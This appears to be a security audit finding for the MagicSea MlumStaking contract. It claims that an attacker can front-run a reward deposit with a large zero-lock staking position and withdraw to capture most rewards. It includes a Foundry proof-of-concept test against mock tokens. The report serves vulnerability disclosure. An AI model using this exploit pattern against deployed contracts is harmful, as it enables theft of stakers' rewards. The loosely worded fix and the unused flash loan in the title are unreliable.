Spicy Lilac Buffalo

High

# pool manipulation with flash loan attack

## Summary
In the contract https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol If there are no reward tokens in the pool, then when adding them to the pool, using a flash loan attack and front run attack, the attacker can manipulate the pool in such a way as to take away most of the reward tokens
## Vulnerability Detail
Several staking token positions have been added to the pool, with lockDuration 365 days and 1 ether staking tokens. having anticipated the transaction of adding a reward token in the mempool, it can create a position with a large value and a lockDuration of 0 seconds, and then remove the position 
 take your profit
## Impact
The attacker will take most of the reward tokens
## Code Snippet
https://github.com/sherlock-audit/2024-06-magicsea/blob/main/magicsea-staking/src/MlumStaking.sol#L354-L390
## Proof of Concept 
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.20;

import "forge-std/Test.sol";

import "openzeppelin-contracts-upgradeable/access/OwnableUpgradeable.sol";
import "../src/transparent/TransparentUpgradeableProxy2Step.sol";

import "openzeppelin/token/ERC721/ERC721.sol";
import "openzeppelin/token/ERC20/ERC20.sol";

import "../src/MlumStaking.sol";

import {ERC20Mock} from "./mocks/ERC20.sol";

contract MlumStakingTest is Test {
    address payable immutable DEV = payable(makeAddr("dev"));
    address payable immutable ALICE = payable(makeAddr("alice"));
    address payable immutable BOB = payable(makeAddr("bob"));
    address payable immutable USER = payable(makeAddr("USER"));

    IMlumStaking private _pool;

    ERC20Mock private _stakingToken;
    ERC20Mock private _rewardToken;

    function setUp() public {
        vm.prank(DEV);
        _stakingToken = new ERC20Mock("MagicLum", "MLUM", 18);

        vm.prank(DEV);
        _rewardToken = new ERC20Mock("USDT", "USDT", 6);

        vm.prank(DEV);

        address _poolImpl = address(new MlumStaking(_stakingToken, _rewardToken));

        _pool = MlumStaking(
            address(
                new TransparentUpgradeableProxy2Step(
                    _poolImpl, ProxyAdmin2Step(address(1)), abi.encodeWithSelector(MlumStaking.initialize.selector, DEV)
                )
            )
        );
    }
    function testAPositionBigAmountTWAP() public {
        _stakingToken.mint(ALICE, 200 ether);
        _stakingToken.mint(BOB, 2 ether);
        _stakingToken.mint(USER, 2 ether);
        vm.startPrank(BOB);
        _stakingToken.approve(address(_pool), 4 ether);
        _pool.createPosition(1 ether, 365 days);
        vm.stopPrank();
        vm.startPrank(USER);
        _stakingToken.approve(address(_pool), 4 ether);
        _pool.createPosition(1 ether, 365 days);
        vm.stopPrank();
        vm.startPrank(ALICE);
        _stakingToken.approve(address(_pool), 200 ether);
        _pool.createPosition(100 ether, 0 seconds);
        vm.stopPrank();
        _rewardToken.mint(address(_pool), 2 ether);
        MlumStaking.StakingPosition memory position = _pool.getStakingPosition(1);
        uint256 alicAmount = _pool.pendingRewards(3);
        vm.startPrank(ALICE);
        _pool.withdrawFromPosition(3, 100 ether);
        vm.stopPrank();
        uint256 rewardBalanceAlic = _rewardToken.balanceOf(ALICE);
        uint256 rewardBalance = _rewardToken.balanceOf(address(_pool));
        uint256 stakingBalance = _stakingToken.balanceOf(ALICE);
        position = _pool.getStakingPosition(1);
        uint256 bobAmount = _pool.pendingRewards(1);
        uint256 userAmount = _pool.pendingRewards(2);
        console2.log(bobAmount, "pending BOB");
        console2.log(alicAmount, "pending Alice");
        console2.log(userAmount, "pending USER");
        console2.log(rewardBalanceAlic, "balance reward token Alice");
        console2.log(rewardBalance, "balance reward token pool");
        console2.log(stakingBalance, "balance staking token pool");
    }
}


```
![2024-07-11_13-18-04](https://github.com/sherlock-audit/2024-06-magicsea-Patreeciy/assets/171034040/b8ea9d38-f292-4332-adaa-b602ffc7904e)

## Tool used

Manual Review

## Recommendation
add time management before withdrawal of funds, and distribution of reward token, only at the end of lockDuration
```require(lockDuration == 0, "locks disabled");```  all time not only ```if (isUnlocked()) ```